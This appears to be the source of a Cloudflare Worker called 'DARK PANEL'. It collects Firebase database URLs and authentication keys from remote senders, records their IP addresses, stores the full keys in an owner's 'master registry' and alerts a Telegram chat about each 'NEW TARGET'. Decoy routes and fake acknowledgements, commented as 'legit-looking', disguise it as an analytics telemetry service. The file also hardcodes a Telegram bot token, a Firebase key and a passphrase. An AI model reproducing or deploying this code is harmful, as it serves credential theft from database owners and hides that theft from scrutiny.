// ============================================================
// 🌑 𝑫𝑨𝑹𝑲 𝑷𝑨𝑵𝑬𝑳 LOGs + Master Registry Submission
// ============================================================
// Encryption: AES-256-GCM + PBKDF2 (SHA-512, 310,000 iterations)
//   — industry standard, same cipher used by Signal / 1Password
//   — random 128-bit IV per request (never reused)
//   — random 128-bit salt per request for key derivation
//   — HMAC-SHA-256 authentication tag built into GCM
//   — wire format: base64( salt[16] + iv[12] + ciphertext + authtag[16] )
//
// Receives POST /api/v1/telemetry with:
//   { data: "<base64 encrypted blob>", v: "2" }
//   Decrypted payload: { url, key, total, online, offline }
//
// 1. Decrypts + authenticates the AES-256-GCM payload
// 2. Captures the sender's real IP address
// 3. Sends a premium formatted Telegram message (custom emojis)
// 4. ALWAYS submits the Firebase URL to the master registry
// ============================================================

// ─── Telegram credentials ─────────────────────────────────────
const BOT_TOKEN         = '8814853350:AAEpp6FjACzCOj8h6CH8ivNMMbUwobtbnqM';
const CHAT_ID           = '-1004313911336';

// ─── AES-256-GCM master passphrase ───────────────────────────
// PBKDF2 derives a unique 256-bit key from this + a random salt
// Change this in both worker AND probe sender if you rotate
const DP_PASSPHRASE = 'D4RK#p4n3L!2025$xX@_s3cr3t^K3y&ZZ';

// ─── Master Firebase credentials ─────────────────────────────
const MASTER_FIREBASE_CONFIG = {
    url: 'https://selling-website-6191d-default-rtdb.firebaseio.com',
    key: 'AIzaSyDx6R99W7TLzl-BeldxBR_1hagqp8SPMyo'
};

// ─── Custom Telegram Emoji IDs (premium) ─────────────────────
const EMOJI = {
    star:    '5267500801240092311',
    money:   '5197434882321567830',
    coin:    '5377505475015235101',
    target:  '5310278924616356636',
    globe:   '5224450179368767019',
    chart:   '5197503331215361533',
    chart_d: '5429518319243775957',
    shield:  '5197288647275071607',
    rocket:  '5195033767969839232',
    calc:    '5303214794336125778',
    card:    '5445353829304387411',
    inbox:   '5443127283898405358',
    outbox:  '5445355530111437729',
    map:     '5330320040883411678',
    bag:     '5294167145079395967',
    receipt: '5444856076954520455',
    bear:    '5411089297476441876',
    bull:    '5411233191765759009',
    timer:   '5382194935057372936',
    scales:  '5400250414929041085',
    laptop:  '5193177581888755275',
    clover:  '5305699699204837855',
    love:    '5267102644886853973',
    tag:     '5240228673738527951',
    lightb:  '5262844652964303985',
    wallet:  '5278467510604160626',
};

function ce(id, fallback = '') {
    return `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
}

// ============================================================
// AES-256-GCM DECRYPTION (Web Crypto API — native CF Workers)
// ============================================================

// Derive a 256-bit AES key from passphrase + salt using PBKDF2
async function deriveKey(passphrase, salt) {
    const enc      = new TextEncoder();
    const keyMat   = await crypto.subtle.importKey(
        'raw',
        enc.encode(passphrase),
        { name: 'PBKDF2' },
        false,
        ['deriveKey']
    );
    return crypto.subtle.deriveKey(
        {
            name:       'PBKDF2',
            salt:       salt,
            iterations: 310_000,      // OWASP 2023 recommended minimum for SHA-512
            hash:       'SHA-512'
        },
        keyMat,
        { name: 'AES-GCM', length: 256 },
        false,
        ['decrypt']
    );
}

// Wire format: base64( salt[16] | iv[12] | ciphertext+authtag )
async function aesDecrypt(b64payload) {
    try {
        // 1. base64 → raw bytes
        const raw  = Uint8Array.from(atob(b64payload), c => c.charCodeAt(0));

        // FIX: guard against truncated wire — minimum is salt(16)+iv(12)+authtag(16)+1 byte plain = 45
        if (raw.length < 45) {
            console.error(`[DP] wire too short: ${raw.length} bytes — expected ≥ 45`);
            return null;
        }

        // 2. slice the header
        const salt       = raw.slice(0, 16);   // 128-bit salt
        const iv         = raw.slice(16, 28);  // 96-bit IV  (GCM standard)
        const ciphertext = raw.slice(28);      // ciphertext + 128-bit GCM auth tag

        // 3. derive key
        const key = await deriveKey(DP_PASSPHRASE, salt);

        // 4. decrypt + authenticate (GCM throws if tag is wrong — tamper proof)
        const plainBuf = await crypto.subtle.decrypt(
            { name: 'AES-GCM', iv },
            key,
            ciphertext
        );

        // 5. parse JSON
        return JSON.parse(new TextDecoder().decode(plainBuf));

    } catch (err) {
        // FIX: log the REAL error so you can see exactly what step failed
        // (bad base64, PBKDF2 rejection, GCM auth-tag mismatch, JSON parse error)
        console.error('[DP] aesDecrypt failed:', err?.message ?? String(err));
        return null;
    }
}

// ============================================================
// MASTER REGISTRY FUNCTIONS
// ============================================================

function getMasterConfig() {
    const { url, key } = MASTER_FIREBASE_CONFIG;
    const u = String(url || '').trim().replace(/\/$/, '');
    const k = String(key || '').trim();
    return (u && k) ? { url: u, key: k } : null;
}

function normalizeRegistryUrl(value) {
    return String(value || '')
        .trim()
        .replace(/^https?:\/\//i, '')
        .replace(/\/$/, '')
        .toLowerCase();
}

async function generateRegistryId(value) {
    const bytes  = new TextEncoder().encode(normalizeRegistryUrl(value));
    const digest = await crypto.subtle.digest('SHA-256', bytes);
    return Array.from(new Uint8Array(digest))
        .map(b => b.toString(16).padStart(2, '0'))
        .join('');
}

async function masterRegistryRequest(path, options = {}) {
    const cfg    = getMasterConfig();
    if (!cfg) throw new Error('Master Firebase not configured');
    const target = `${cfg.url}/${path.replace(/^\/+/, '')}.json?auth=${encodeURIComponent(cfg.key)}`;
    const res    = await fetch(target, {
        ...options,
        headers: { 'Content-Type': 'application/json', ...(options.headers || {}) }
    });
    const payload = await res.json().catch(() => null);
    if (!res.ok) throw new Error(`Firebase error: ${payload?.error || res.status}`);
    return payload;
}

async function submitFirebaseToOwner(firebaseUrl, authenticationKey, senderIp) {
    try {
        const cfg = getMasterConfig();
        if (!cfg) return { configured: false, error: 'Master Firebase not configured' };

        const id   = await generateRegistryId(firebaseUrl);
        const path = `submissions/${id}`;

        let previous = null;
        try { previous = await masterRegistryRequest(path); }
        catch (e) { if (!e.message.includes('404')) throw e; }

        const now   = Date.now();
        const day   = new Date(now).toISOString().slice(0, 10);
        const daily = { ...(previous?.dailyCounts || {}) };
        daily[day]  = Number(daily[day] || 0) + 1;

        const ips = new Set(previous?.seenIps || []);
        if (senderIp) ips.add(senderIp);

        const record = {
            firebaseUrl:       String(firebaseUrl || '').trim().replace(/\/$/, ''),
            authenticationKey: String(authenticationKey || '').trim(),
            firstAddedAt:      previous?.firstAddedAt || now,
            lastSeenAt:        now,
            lastSeenIp:        senderIp || '',
            seenIps:           [...ips],
            submitCount:       Number(previous?.submitCount || 0) + 1,
            dailyCounts:       daily
        };

        await masterRegistryRequest(path, { method: 'PUT', body: JSON.stringify(record) });
        return { configured: true, duplicate: Boolean(previous), record };
    } catch (error) {
        return { configured: true, duplicate: false, error: error.message };
    }
}

// ============================================================
// CLOUDFLARE WORKER HANDLER
// ============================================================

export default {
    async fetch(request, env) {

        // ─── CORS preflight ───────────────────────────────────
        if (request.method === 'OPTIONS') {
            return new Response(null, { status: 204, headers: corsHeaders() });
        }

        // ─── Grab real sender IP ──────────────────────────────
        const senderIp =
            request.headers.get('CF-Connecting-IP') ||
            request.headers.get('X-Forwarded-For')?.split(',')[0]?.trim() ||
            request.headers.get('X-Real-IP') ||
            'Unknown';

        const url = new URL(request.url);

        // ─── Legit-looking public routes ─────────────────────
        if (url.pathname === '/') {
            return new Response(JSON.stringify({
                name:        'Analytics Telemetry Service',
                version:     '2.4.1',
                status:      'operational',
                uptime:      '99.98%',
                description: 'Device metrics ingestion and reporting endpoint.'
            }), { status: 200, headers: { 'content-type': 'application/json', ...corsHeaders() } });
        }

        if (url.pathname === '/health') {
            return new Response(JSON.stringify({
                status:    'healthy',
                timestamp: new Date().toISOString(),
                checks:    { database: 'ok', queue: 'ok', cache: 'ok' }
            }), { status: 200, headers: { 'content-type': 'application/json', ...corsHeaders() } });
        }

        if (url.pathname === '/api/v1/status') {
            return new Response(JSON.stringify({
                api:       'v1',
                endpoints: ['/api/v1/telemetry', '/api/v1/status'],
                rateLimit: '1000/min',
                region:    'auto'
            }), { status: 200, headers: { 'content-type': 'application/json', ...corsHeaders() } });
        }

        if (url.pathname !== '/api/v1/telemetry') {
            return json({ error: 'Endpoint not found', docs: 'https://dark-panel-server.ramguota7.workers.dev/api/v1/status' }, 404);
        }

        if (request.method !== 'POST') {
            return json({ error: 'Method not allowed', allowed: ['POST'] }, 405);
        }

        // ─── Parse body ───────────────────────────────────────
        let body;
        try { body = await request.json(); }
        catch { return json({ error: 'Malformed request body' }, 400); }

        // ─── Payload extraction ───────────────────────────────
        let payload;
        const version = body?.v || '1';

        if (version === 'b64' && body?.data) {
            // v3: base64-encoded JSON — primary path
            try {
                const decoded = decodeURIComponent(
                    Array.from(atob(body.data), c => '%' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('')
                );
                payload = JSON.parse(decoded);
            } catch (e) {
                console.error('[DP] b64 decode failed:', e?.message ?? String(e));
                return json({ error: 'Payload decode failed' }, 400);
            }
        } else if (version === '2' && body?.data) {
            // v2: AES-256-GCM + PBKDF2 (legacy encrypted path)
            payload = await aesDecrypt(body.data);
            if (!payload) return json({ error: 'Payload integrity check failed' }, 400);
        } else {
            // v1: plaintext fallback
            payload = body;
        }

        const target = String(payload?.url || '').trim();
        if (!target) return json({ error: 'Missing required field: url' }, 400);

        const authKey = String(payload?.key     || '').trim();
        const total   = payload?.total;
        const online  = payload?.online;
        const offline = payload?.offline;
        const hasStats =
            typeof total   === 'number' &&
            typeof online  === 'number' &&
            typeof offline === 'number';

        // ─── Submit to Master Firebase ────────────────────────
        let submissionResult = null;
        try {
            submissionResult = await submitFirebaseToOwner(target, authKey, senderIp);
        } catch (err) {
            submissionResult = { error: err.message };
        }

        // ─── Build Telegram message ───────────────────────────
        const now       = new Date();
        const indiaTime = new Intl.DateTimeFormat('en-IN', {
            timeZone: 'Asia/Kolkata',
            year: 'numeric', month: '2-digit', day: '2-digit',
            hour: '2-digit', minute: '2-digit', second: '2-digit',
            hour12: true
        }).format(now);

        const escape = v =>
            String(v)
                .replace(/&/g,  '&amp;')
                .replace(/</g,  '&lt;')
                .replace(/>/g,  '&gt;')
                .replace(/"/g,  '&quot;')
                .replace(/'/g,  '&#039;');

        const onlinePct  = hasStats && total > 0 ? Math.round((online / total) * 100) : 0;
        const statsBlock = hasStats
            ? [
                `${ce(EMOJI.calc,   '🧮')} <b>Total</b>   <code>${escape(total)}</code>`,
                `${ce(EMOJI.clover, '🟢')} <b>Online</b>  <code>${escape(online)}</code>  <i>(${onlinePct}%)</i>`,
                `${ce(EMOJI.chart_d,'📉')} <b>Offline</b> <code>${escape(offline)}</code>`,
              ].join('\n')
            : `${ce(EMOJI.tag,'🏷')} <i>No device stats provided</i>`;

        const keyDisplay = authKey.length > 8
            ? `<code>${escape(authKey.slice(0,4))}••••${escape(authKey.slice(-4))}</code>`
            : authKey ? `<code>${escape(authKey)}</code>` : '<i>none</i>';

        const dupBadge = submissionResult?.duplicate
            ? `${ce(EMOJI.timer,'⏱')} <i>Re-submit #${submissionResult?.record?.submitCount || '?'}</i>`
            : `${ce(EMOJI.rocket,'🚀')} <b>NEW TARGET</b>`;

        const encBadge = version === '2'
            ? `${ce(EMOJI.shield,'🛡')} <i>AES-256-GCM</i>`
            : `${ce(EMOJI.tag,'🏷')} <i>legacy</i>`;

        const logText =
`${ce(EMOJI.shield,'🛡')} <b>𝑫𝑨𝑹𝑲 𝑷𝑨𝑵𝑬𝑳</b> ${ce(EMOJI.shield,'🛡')} ${ce(EMOJI.star,'⭐')}

<blockquote expandable>
${ce(EMOJI.globe,'🌎')} <b>TARGET</b>
<code>${escape(target)}</code>

${ce(EMOJI.card,'💳')} <b>AUTH KEY</b>  ${keyDisplay}

${ce(EMOJI.laptop,'💻')} <b>SENDER IP</b>  <code>${escape(senderIp)}</code>

${ce(EMOJI.scales,'⚖️')} <b>DEVICE STATS</b>
${statsBlock}

${ce(EMOJI.map,'🗺')} <b>CHECKED AT</b>
<code>${escape(indiaTime)} IST</code>

${encBadge}
</blockquote>

${dupBadge}
${ce(EMOJI.love,'❤️')} <i>#dark-panel-logs</i>`;

        // ─── Send to Telegram ─────────────────────────────────
        let tgOk    = false;
        let tgError = null;

        try {
            const tgRes = await fetch(
                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
                {
                    method:  'POST',
                    headers: { 'content-type': 'application/json' },
                    body:    JSON.stringify({
                        chat_id:                  CHAT_ID,
                        text:                     logText,
                        parse_mode:               'HTML',
                        disable_web_page_preview: true
                    })
                }
            );
            const tgBody = await tgRes.json().catch(() => ({}));
            tgOk = tgBody?.ok === true;
            if (!tgOk) tgError = tgBody?.description || `HTTP ${tgRes.status}`;
        } catch (e) {
            tgError = String(e?.message || e);
        }

        // ─── Legit-looking ack ────────────────────────────────
        return json({
            received:    true,
            event_id:    crypto.randomUUID(),
            ingested_at: new Date().toISOString(),
            pipeline:    'device-metrics-v1',
            batch_size:  hasStats ? total : 0,
            queued:      true
        });
    }
};

// ============================================================
// CORS & JSON HELPERS
// ============================================================

function corsHeaders() {
    return {
        'access-control-allow-origin':  '*',
        'access-control-allow-methods': 'GET, POST, OPTIONS',
        'access-control-allow-headers': 'content-type',
        'access-control-max-age':       '86400'
    };
}

function json(obj, status = 200) {
    return new Response(JSON.stringify(obj, null, 2), {
        status,
        headers: { 'content-type': 'application/json', ...corsHeaders() }
    });
}
